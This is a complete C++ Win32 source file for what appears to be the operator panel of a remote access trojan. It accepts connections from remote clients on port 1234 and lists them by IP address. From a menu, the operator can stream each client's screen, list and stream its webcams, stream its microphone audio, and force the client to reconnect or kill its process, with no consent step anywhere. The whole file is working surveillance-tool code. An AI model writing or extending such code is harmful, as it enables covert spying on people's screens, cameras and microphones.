#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS

#include <winsock2.h>
#include <windows.h>
#include <commctrl.h>
#include <gdiplus.h>
#include <mmsystem.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "comctl32.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "winmm.lib")

using namespace Gdiplus;

#define SERVER_PORT 1234
#define IDC_LISTVIEW 1001

#define IDM_START_RDP    2001
#define IDM_STOP_RDP     2002
#define IDM_START_MIC    2003
#define IDM_STOP_MIC     2004
#define IDM_FETCH_CAM    2005
#define IDM_STOP_CAM     2006
#define IDM_EXIT         2007
#define IDM_KICK_CLIENT  2010
#define IDM_CLOSE_CLIENT 2011

#define IDM_START_CAM_BASE 3000

#define WM_CLIENT_UPDATE (WM_USER + 1)
#define WM_CLIENT_DISCONNECT (WM_USER + 2)
#define WM_CLIENT_UPDATE_STATUS (WM_USER + 3) 

HWND hMainWindow = NULL;
HWND hListView = NULL;
HWND hRdpWindow = NULL;
HWND hCamWindow = NULL;
HWAVEOUT hWaveOut = NULL;

struct ClientData {
	SOCKET sock; int id; char ipAddress[16];
	char status[256];
	char webcamList[1024];
	BYTE* latestRdpFrame; DWORD rdpFrameSize;
	BYTE* latestCamFrame; DWORD camFrameSize;
	CRITICAL_SECTION cs;
};

ClientData* activeClient = NULL;

bool RecvAll(SOCKET sock, char* buffer, int size) {
	int total = 0;
	while (total < size) {
		int bytes = recv(sock, buffer + total, size - total, 0);
		if (bytes <= 0) return false;
		total += bytes;
	}
	return true;
}

// --- FIXED: Removed manual GlobalFree(hGlobal) which caused Heap Corruption ---
bool DrawJpeg(HDC hdc, BYTE* buffer, DWORD size, RECT rect) {
	if (!buffer || size == 0) return false;
	bool success = false;
	HGLOBAL hGlobal = GlobalAlloc(GMEM_MOVEABLE, size);
	if (hGlobal) {
		void* pData = GlobalLock(hGlobal);
		memcpy(pData, buffer, size);
		GlobalUnlock(hGlobal);

		IStream* pStream = NULL;
		// The TRUE flag explicitly tells the Stream object to FREE hGlobal when Release() is called
		if (CreateStreamOnHGlobal(hGlobal, TRUE, &pStream) == S_OK) {
			Image image(pStream);
			if (image.GetLastStatus() == Ok) {
				Graphics graphics(hdc);
				graphics.DrawImage(&image, 0, 0, rect.right, rect.bottom);
				success = true;
			}
			pStream->Release(); // Auto-frees the hGlobal
		}
		else {
			GlobalFree(hGlobal); // Only free manually if the Stream failed to construct
		}
	}
	return success;
}

void CALLBACK waveOutProc(HWAVEOUT hwo, UINT uMsg, DWORD_PTR dwInstance, DWORD_PTR dwParam1, DWORD_PTR dwParam2) {
	if (uMsg == WOM_DONE) {
		WAVEHDR* wh = (WAVEHDR*)dwParam1;
		waveOutUnprepareHeader(hwo, wh, sizeof(WAVEHDR));
		free(wh->lpData);
		delete wh;
	}
}

void PlayAudioChunk(BYTE* buffer, DWORD size) {
	if (!hWaveOut) {
		WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, sizeof(WAVEFORMATEX) };
		waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, (DWORD_PTR)waveOutProc, 0, CALLBACK_FUNCTION);
	}
	WAVEHDR* wh = new WAVEHDR();
	wh->lpData = (LPSTR)buffer; wh->dwBufferLength = size;
	wh->dwFlags = 0; wh->dwLoops = 0;
	waveOutPrepareHeader(hWaveOut, wh, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, wh, sizeof(WAVEHDR));
}

// --- Threads ---
DWORD WINAPI ClientHandlerThread(LPVOID lpParam) {
	ClientData* client = (ClientData*)lpParam;
	while (true) {
		BYTE cmd;
		if (recv(client->sock, (char*)&cmd, 1, 0) <= 0) break;

		if (cmd == 0x02 || cmd == 0x04) {
			DWORD size = 0;
			if (!RecvAll(client->sock, (char*)&size, 4)) break;

			// FIXED: Safeguard against malformed streams crashing the Malloc Engine
			if (size == 0 || size > 15000000) break;

			BYTE* buffer = (BYTE*)malloc(size);
			if (!buffer) break; // Drop connection if Out of Memory instead of crashing

			if (!RecvAll(client->sock, (char*)buffer, size)) { free(buffer); break; }

			EnterCriticalSection(&client->cs);
			if (cmd == 0x02) {
				if (client->latestRdpFrame) free(client->latestRdpFrame);
				client->latestRdpFrame = buffer; client->rdpFrameSize = size;
				if (hRdpWindow && IsWindowVisible(hRdpWindow) && activeClient == client) InvalidateRect(hRdpWindow, NULL, FALSE);
			}
			else {
				if (client->latestCamFrame) free(client->latestCamFrame);
				client->latestCamFrame = buffer; client->camFrameSize = size;
				if (hCamWindow && IsWindowVisible(hCamWindow) && activeClient == client) InvalidateRect(hCamWindow, NULL, FALSE);
			}
			LeaveCriticalSection(&client->cs);
		}
		else if (cmd == 0x05) {
			DWORD size = 0;
			if (!RecvAll(client->sock, (char*)&size, 4)) break;
			if (size == 0 || size > 5000000) break;

			BYTE* buffer = (BYTE*)malloc(size);
			if (!buffer) break;

			if (!RecvAll(client->sock, (char*)buffer, size)) { free(buffer); break; }

			if (activeClient == client) PlayAudioChunk(buffer, size);
			else free(buffer);
		}
		else if (cmd == 0x06) {
			DWORD len = 0;
			if (!RecvAll(client->sock, (char*)&len, 4)) break;
			if (len == 0 || len > 1024) break;

			char* statBuf = (char*)malloc(len + 1);
			if (!statBuf) break;
			if (!RecvAll(client->sock, statBuf, len)) { free(statBuf); break; }
			statBuf[len] = '\0';

			EnterCriticalSection(&client->cs);
			strcpy(client->status, statBuf);
			LeaveCriticalSection(&client->cs);

			PostMessage(hMainWindow, WM_CLIENT_UPDATE_STATUS, (WPARAM)client, 0);
			free(statBuf);
		}
		else if (cmd == 0x07) {
			DWORD len = 0;
			if (!RecvAll(client->sock, (char*)&len, 4)) break;
			if (len == 0 || len > 4096) break;

			char* listBuf = (char*)malloc(len + 1);
			if (!listBuf) break;
			if (!RecvAll(client->sock, listBuf, len)) { free(listBuf); break; }
			listBuf[len] = '\0';

			EnterCriticalSection(&client->cs);
			strcpy(client->webcamList, listBuf);
			strcpy(client->status, "Webcam List Fetched Successfully.");
			LeaveCriticalSection(&client->cs);

			PostMessage(hMainWindow, WM_CLIENT_UPDATE_STATUS, (WPARAM)client, 0);
			free(listBuf);
		}
	}
	PostMessage(hMainWindow, WM_CLIENT_DISCONNECT, (WPARAM)client, 0);
	return 0;
}

DWORD WINAPI ListenerThread(LPVOID lpParam) {
	SOCKET listenSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	struct sockaddr_in server = { AF_INET, htons(SERVER_PORT), INADDR_ANY };
	bind(listenSock, (struct sockaddr*)&server, sizeof(server));
	listen(listenSock, SOMAXCONN);

	int idCounter = 1;
	while (true) {
		struct sockaddr_in clientAddr; int clientLen = sizeof(clientAddr);
		SOCKET clientSock = accept(listenSock, (struct sockaddr*)&clientAddr, &clientLen);

		if (clientSock != INVALID_SOCKET) {
			ClientData* client = new ClientData();
			client->sock = clientSock; client->id = idCounter++;
			strcpy(client->ipAddress, inet_ntoa(clientAddr.sin_addr));
			strcpy(client->status, "Connecting...");
			strcpy(client->webcamList, "");
			client->latestRdpFrame = NULL; client->latestCamFrame = NULL;
			InitializeCriticalSection(&client->cs);

			PostMessage(hMainWindow, WM_CLIENT_UPDATE, (WPARAM)client, 0);
			CreateThread(NULL, 0, ClientHandlerThread, client, 0, NULL);
		}
	}
	return 0;
}

// --- Window Procedures ---
LRESULT CALLBACK VideoWndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
	switch (msg) {
	case WM_PAINT: {
		PAINTSTRUCT ps; HDC hdc = BeginPaint(hwnd, &ps);
		RECT rect; GetClientRect(hwnd, &rect);
		HDC hMemDC = CreateCompatibleDC(hdc);
		HBITMAP hBitmap = CreateCompatibleBitmap(hdc, rect.right, rect.bottom);
		SelectObject(hMemDC, hBitmap);

		FillRect(hMemDC, &rect, (HBRUSH)(COLOR_WINDOW + 1));
		bool hasDrawn = false;

		if (activeClient) {
			EnterCriticalSection(&activeClient->cs);
			if (hwnd == hRdpWindow) hasDrawn = DrawJpeg(hMemDC, activeClient->latestRdpFrame, activeClient->rdpFrameSize, rect);
			if (hwnd == hCamWindow) hasDrawn = DrawJpeg(hMemDC, activeClient->latestCamFrame, activeClient->camFrameSize, rect);
			LeaveCriticalSection(&activeClient->cs);
		}

		if (!hasDrawn) {
			SetBkMode(hMemDC, TRANSPARENT);
			SetTextColor(hMemDC, RGB(100, 100, 100));
			TextOutA(hMemDC, 10, 10, "Waiting for video feed payload...", 33);
		}

		BitBlt(hdc, 0, 0, rect.right, rect.bottom, hMemDC, 0, 0, SRCCOPY);
		DeleteObject(hBitmap); DeleteDC(hMemDC); EndPaint(hwnd, &ps); return 0;
	}
	case WM_CLOSE:
		if (activeClient) {
			BYTE cmd = (hwnd == hRdpWindow) ? 0x11 : 0x13;
			send(activeClient->sock, (char*)&cmd, 1, 0);
		}
		ShowWindow(hwnd, SW_HIDE); return 0;
	}
	return DefWindowProcA(hwnd, msg, wParam, lParam);
}

void BuildMainMenu(HWND hwnd) {
	HMENU hMenu = CreateMenu();
	HMENU hSubMenu = CreatePopupMenu();
	AppendMenuA(hSubMenu, MF_STRING | MF_GRAYED, 0, "Select a client via Right-Click to operate.");
	AppendMenuA(hMenu, MF_POPUP, (UINT_PTR)hSubMenu, "Commands");

	HMENU hFileMenu = CreatePopupMenu(); AppendMenuA(hFileMenu, MF_STRING, IDM_EXIT, "Exit");
	AppendMenuA(hMenu, MF_POPUP, (UINT_PTR)hFileMenu, "File"); SetMenu(hwnd, hMenu);
}

void ShowContextMenu(HWND hwnd) {
	int sel = ListView_GetNextItem(hListView, -1, LVNI_SELECTED);
	ClientData* selClient = NULL;
	if (sel != -1) {
		LVITEMA lvi; ZeroMemory(&lvi, sizeof(LVITEMA)); lvi.mask = LVIF_PARAM; lvi.iItem = sel;
		ListView_GetItem(hListView, &lvi);
		selClient = (ClientData*)lvi.lParam;
	}

	HMENU hSubMenu = CreatePopupMenu();
	AppendMenuA(hSubMenu, MF_STRING, IDM_START_RDP, "Start Remote Desktop");
	AppendMenuA(hSubMenu, MF_STRING, IDM_STOP_RDP, "Stop Remote Desktop");
	AppendMenuA(hSubMenu, MF_SEPARATOR, 0, NULL);

	HMENU hCamMenu = CreatePopupMenu();
	AppendMenuA(hCamMenu, MF_STRING, IDM_FETCH_CAM, "1. Fetch Webcam List");
	AppendMenuA(hCamMenu, MF_SEPARATOR, 0, NULL);

	if (selClient && strlen(selClient->webcamList) > 0 && strcmp(selClient->webcamList, "None") != 0) {
		char copy[1024];
		EnterCriticalSection(&selClient->cs);
		strcpy(copy, selClient->webcamList);
		LeaveCriticalSection(&selClient->cs);

		char* line = strtok(copy, "\n");
		while (line != NULL) {
			int idx; char name[256];
			char* sep = strchr(line, '|');
			if (sep) {
				*sep = '\0';
				idx = atoi(line);
				strcpy(name, sep + 1);

				char display[300];
				sprintf(display, "Start: %s", name);
				AppendMenuA(hCamMenu, MF_STRING, IDM_START_CAM_BASE + idx, display);
			}
			line = strtok(NULL, "\n");
		}
	}
	else {
		AppendMenuA(hCamMenu, MF_STRING | MF_GRAYED, 0, "(No Webcams / Fetch List First)");
	}

	AppendMenuA(hCamMenu, MF_SEPARATOR, 0, NULL);
	AppendMenuA(hCamMenu, MF_STRING, IDM_STOP_CAM, "Stop Webcam");
	AppendMenuA(hSubMenu, MF_POPUP, (UINT_PTR)hCamMenu, "Webcams");

	AppendMenuA(hSubMenu, MF_SEPARATOR, 0, NULL);
	AppendMenuA(hSubMenu, MF_STRING, IDM_START_MIC, "Start Microphone");
	AppendMenuA(hSubMenu, MF_STRING, IDM_STOP_MIC, "Stop Microphone");

	AppendMenuA(hSubMenu, MF_SEPARATOR, 0, NULL);
	HMENU hAdminMenu = CreatePopupMenu();
	AppendMenuA(hAdminMenu, MF_STRING, IDM_KICK_CLIENT, "Kick Client (Force Reconnect)");
	AppendMenuA(hAdminMenu, MF_STRING, IDM_CLOSE_CLIENT, "Close Client (Terminate Process)");
	AppendMenuA(hSubMenu, MF_POPUP, (UINT_PTR)hAdminMenu, "Administration");

	POINT pt; GetCursorPos(&pt);
	TrackPopupMenu(hSubMenu, TPM_RIGHTBUTTON, pt.x, pt.y, 0, hwnd, NULL); DestroyMenu(hSubMenu);
}

LRESULT CALLBACK MainWndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
	switch (msg) {
	case WM_CREATE: {
		BuildMainMenu(hwnd);
		INITCOMMONCONTROLSEX icex = { sizeof(INITCOMMONCONTROLSEX), ICC_LISTVIEW_CLASSES }; InitCommonControlsEx(&icex);
		hListView = CreateWindowExA(0, WC_LISTVIEW, "", WS_CHILD | WS_VISIBLE | LVS_REPORT | LVS_SINGLESEL, 0, 0, 600, 400, hwnd, (HMENU)IDC_LISTVIEW, GetModuleHandle(NULL), NULL);
		ListView_SetExtendedListViewStyle(hListView, LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES);
		LVCOLUMNA lvc; ZeroMemory(&lvc, sizeof(LVCOLUMNA)); lvc.mask = LVCF_TEXT | LVCF_WIDTH | LVCF_SUBITEM;
		lvc.pszText = (LPSTR)"ID"; lvc.cx = 50; ListView_InsertColumn(hListView, 0, &lvc);
		lvc.pszText = (LPSTR)"IP Address"; lvc.cx = 150; ListView_InsertColumn(hListView, 1, &lvc);
		lvc.pszText = (LPSTR)"Status"; lvc.cx = 300; ListView_InsertColumn(hListView, 2, &lvc);
		CreateThread(NULL, 0, ListenerThread, NULL, 0, NULL); return 0;
	}
	case WM_NOTIFY:
		if (((LPNMHDR)lParam)->code == NM_RCLICK && ((LPNMHDR)lParam)->idFrom == IDC_LISTVIEW) ShowContextMenu(hwnd);
		return 0;

	case WM_COMMAND: {
		if (LOWORD(wParam) == IDM_EXIT) PostQuitMessage(0);

		int sel = ListView_GetNextItem(hListView, -1, LVNI_SELECTED);
		if (sel != -1) {
			LVITEMA lvi; ZeroMemory(&lvi, sizeof(LVITEMA)); lvi.mask = LVIF_PARAM; lvi.iItem = sel;
			ListView_GetItem(hListView, &lvi); activeClient = (ClientData*)lvi.lParam;

			if (LOWORD(wParam) >= IDM_START_CAM_BASE && LOWORD(wParam) <= IDM_START_CAM_BASE + 9) {
				int camIdx = LOWORD(wParam) - IDM_START_CAM_BASE;
				BYTE cmd = 0x17;
				send(activeClient->sock, (char*)&cmd, 1, 0);
				send(activeClient->sock, (char*)&camIdx, 4, 0);
				ShowWindow(hCamWindow, SW_SHOW);
				UpdateWindow(hCamWindow);
				return 0;
			}

			BYTE cmd = 0; HWND targetWnd = NULL;

			if (LOWORD(wParam) == IDM_START_RDP) { cmd = 0x10; targetWnd = hRdpWindow; }
			if (LOWORD(wParam) == IDM_START_MIC) { cmd = 0x14; }
			if (LOWORD(wParam) == IDM_FETCH_CAM) { cmd = 0x16; }
			if (LOWORD(wParam) == IDM_STOP_RDP) { cmd = 0x11; targetWnd = hRdpWindow; }
			if (LOWORD(wParam) == IDM_STOP_CAM) { cmd = 0x13; targetWnd = hCamWindow; }
			if (LOWORD(wParam) == IDM_STOP_MIC) { cmd = 0x15; }

			if (LOWORD(wParam) == IDM_KICK_CLIENT) {
				cmd = 0x98;
				send(activeClient->sock, (char*)&cmd, 1, 0);
				closesocket(activeClient->sock);
			}
			else if (LOWORD(wParam) == IDM_CLOSE_CLIENT) {
				cmd = 0x99;
				send(activeClient->sock, (char*)&cmd, 1, 0);
				closesocket(activeClient->sock);
			}

			if (cmd != 0 && cmd != 0x98 && cmd != 0x99) {
				send(activeClient->sock, (char*)&cmd, 1, 0);
			}

			if (targetWnd) {
				if (LOWORD(wParam) == IDM_STOP_RDP || LOWORD(wParam) == IDM_STOP_CAM) {
					ShowWindow(targetWnd, SW_HIDE);
				}
				else if (LOWORD(wParam) == IDM_START_RDP) {
					ShowWindow(targetWnd, SW_SHOW);
					UpdateWindow(targetWnd);
				}
			}
		}
		return 0;
	}
	case WM_CLIENT_UPDATE_STATUS: {
		ClientData* target = (ClientData*)wParam;
		for (int i = 0; i < ListView_GetItemCount(hListView); i++) {
			LVITEMA lvi; ZeroMemory(&lvi, sizeof(LVITEMA)); lvi.mask = LVIF_PARAM; lvi.iItem = i;
			ListView_GetItem(hListView, &lvi);
			if ((ClientData*)lvi.lParam == target) {
				EnterCriticalSection(&target->cs);
				ListView_SetItemText(hListView, i, 2, target->status);
				LeaveCriticalSection(&target->cs);
				break;
			}
		}
		return 0;
	}
	case WM_CLIENT_UPDATE: {
		ClientData* client = (ClientData*)wParam; char idStr[16]; sprintf(idStr, "%d", client->id);
		LVITEMA lvi; ZeroMemory(&lvi, sizeof(LVITEMA)); lvi.mask = LVIF_TEXT | LVIF_PARAM;
		lvi.iItem = ListView_GetItemCount(hListView); lvi.pszText = idStr; lvi.lParam = (LPARAM)client;
		int index = ListView_InsertItem(hListView, &lvi);
		ListView_SetItemText(hListView, index, 1, client->ipAddress); ListView_SetItemText(hListView, index, 2, client->status); return 0;
	}
	case WM_CLIENT_DISCONNECT: {
		ClientData* client = (ClientData*)wParam;
		for (int i = 0; i < ListView_GetItemCount(hListView); i++) {
			LVITEMA lvi; ZeroMemory(&lvi, sizeof(LVITEMA)); lvi.mask = LVIF_PARAM; lvi.iItem = i; ListView_GetItem(hListView, &lvi);
			if ((ClientData*)lvi.lParam == client) { ListView_DeleteItem(hListView, i); break; }
		}
		if (activeClient == client) { activeClient = NULL; ShowWindow(hRdpWindow, SW_HIDE); ShowWindow(hCamWindow, SW_HIDE); }
		closesocket(client->sock); DeleteCriticalSection(&client->cs);
		if (client->latestRdpFrame) free(client->latestRdpFrame); if (client->latestCamFrame) free(client->latestCamFrame);
		delete client; return 0;
	}
	case WM_SIZE: SetWindowPos(hListView, NULL, 0, 0, LOWORD(lParam), HIWORD(lParam), SWP_NOZORDER); return 0;
	case WM_DESTROY: PostQuitMessage(0); return 0;
	}
	return DefWindowProcA(hwnd, msg, wParam, lParam);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR cmd, int show) {
	WSADATA wsa; WSAStartup(MAKEWORD(2, 2), &wsa);
	GdiplusStartupInput gdiplusStartupInput; ULONG_PTR gdiplusToken; GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

	WNDCLASSEXA wcMain; ZeroMemory(&wcMain, sizeof(WNDCLASSEXA)); wcMain.cbSize = sizeof(WNDCLASSEXA); wcMain.lpfnWndProc = MainWndProc;
	wcMain.hInstance = hInstance; wcMain.hCursor = LoadCursor(NULL, IDC_ARROW); wcMain.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1); wcMain.lpszClassName = "ServerMain"; RegisterClassExA(&wcMain);

	WNDCLASSEXA wcVideo; ZeroMemory(&wcVideo, sizeof(WNDCLASSEXA)); wcVideo.cbSize = sizeof(WNDCLASSEXA); wcVideo.lpfnWndProc = VideoWndProc;
	wcVideo.hInstance = hInstance; wcVideo.hCursor = LoadCursor(NULL, IDC_ARROW); wcVideo.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1); wcVideo.lpszClassName = "VideoViewer"; RegisterClassExA(&wcVideo);

	hMainWindow = CreateWindowExA(0, "ServerMain", "Native C Server Controller", WS_OVERLAPPEDWINDOW, 100, 100, 600, 400, NULL, NULL, hInstance, NULL);
	hRdpWindow = CreateWindowExA(0, "VideoViewer", "Remote Desktop Stream", WS_OVERLAPPEDWINDOW, 200, 200, 800, 600, hMainWindow, NULL, hInstance, NULL);
	hCamWindow = CreateWindowExA(0, "VideoViewer", "Webcam Stream", WS_OVERLAPPEDWINDOW, 250, 250, 640, 480, hMainWindow, NULL, hInstance, NULL);

	ShowWindow(hMainWindow, show);
	MSG msg; while (GetMessage(&msg, NULL, 0, 0)) { TranslateMessage(&msg); DispatchMessage(&msg); }

	if (hWaveOut) { waveOutReset(hWaveOut); waveOutClose(hWaveOut); }
	GdiplusShutdown(gdiplusToken); WSACleanup(); return 0;
}